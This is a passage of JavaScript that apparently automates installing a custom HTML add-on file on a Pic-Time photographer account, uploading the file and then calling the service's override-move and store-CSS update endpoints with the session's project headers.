            const uploadResp = await fetch(uploadUrl, {
              method: "PUT",
              headers: {
                Accept: "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Cache-Control": "no-cache",
                Connection: "keep-alive",
                "Content-Length": jsonFileSizeInBytes,
                "Content-Type": "text/html",
                Origin: "https://cstool.pic-time.com",
                Pragma: "no-cache",
                Referer: "https://cstool.pic-time.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent":
                  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                "x-ms-blob-type": "BlockBlob",
                "x-ms-meta-qqfilename": "photographer_htmladdon.html",
              },
              body: jsonFileBuffer,
            });

            const data = await uploadResp.text();

            window.insertDoc("script-upload-response", {
              status: uploadResp.status,
              data: data,
            });
          } catch (e) {
            console.error(e);
            window.insertDoc("error", e.toString());
            return;
          }

          let moveOverridesResp;

          try {
            moveOverridesResp = await fetch(
              "https://cstool.pic-time.com/!servicescs.asmx/moveOverrideFiles",
              {
                headers: {
                  accept: "application/json, text/javascript, */*; q=0.01",
                  "accept-language": "en-US,en;q=0.9",
                  "cache-control": "no-cache",
                  "content-type": "application/json; charset=UTF-8",
                  pictimeGUser: window.ptData.headers.gusr,
                  pictimeProject: window.ptData.headers.lusr,
                },
                body: JSON.stringify({
                  resourceName: "photographer_htmladdon",
                  tempFileName: `${uuid}.html`,
                }),
                method: "POST",
              }
            );

            const data = await moveOverridesResp.text();

            window.insertDoc("move-override-files-response", {
              status: moveOverridesResp.status,
              data: data,
            });
          } catch (e) {
            console.error(e);
            window.insertDoc("error", e.toString());
            return;
          }

          try {
            const updateStoreLangCssResp = await fetch(
              "https://cstool.pic-time.com/!servicescs.asmx/updateStoreLangCss",
              {
                headers: {
                  accept: "application/json, text/javascript, */*; q=0.01",
                  "accept-language": "en-US,en;q=0.9",
                  "cache-control": "no-cache",
                  "content-type": "application/json; charset=UTF-8",
                  pictimeGUser: window.ptData.headers.gusr,
                  pictimeProject: window.ptData.headers.lusr,
                },
                body: JSON.stringify({ locale: "en-us" }),
                method: "POST",
              }
            );

            const data = await updateStoreLangCssResp.text();

            window.insertDoc("update-store-lang-css-response", {
              status: updateStoreLangCssResp.status,
              data: data,
            });
          } catch (e) {
            console.error(e);
            window.insertDoc("error", e.toString());
            return;
          }
        }
      });
    } catch (err) {
      console.error(err);
      window.ptxSetupComplete = false;
    }
  }
}
